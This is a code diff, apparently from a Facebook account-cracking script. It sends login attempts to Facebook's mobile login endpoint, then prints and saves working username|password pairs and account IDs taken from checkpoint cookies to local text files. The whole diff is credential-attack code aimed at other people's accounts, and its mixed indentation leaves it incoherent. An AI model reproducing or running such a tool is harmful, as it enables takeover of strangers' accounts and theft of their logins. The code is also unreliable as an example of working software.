@@ -1286,22 +1286,19 @@ class Main:
     'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
 }
 lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
-    if 'y' in cokix:
-     print(f'\r{gen}{H}'+coki)
-    ok+=1 
-    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
-    ok.append(user)
-    break
-   elif 'checkpoint' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    coki1 = coki.split("1000")[1]
-    uid = "1000"+coki1[0:11]
-    if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
-    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
-    cp.append(idf)
-   else:
-    continue
-  loop+=1
+                                print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print ("\r \033[0;92m Congrats Bro ")
+				self.ok.append("%s|%s"%(uid, pw))
+				open("2009-BH➳TEAM-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("2009-BH➳TEAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				break
+			else:
+				continue
+
+		self.loop +=1
+		 
 		
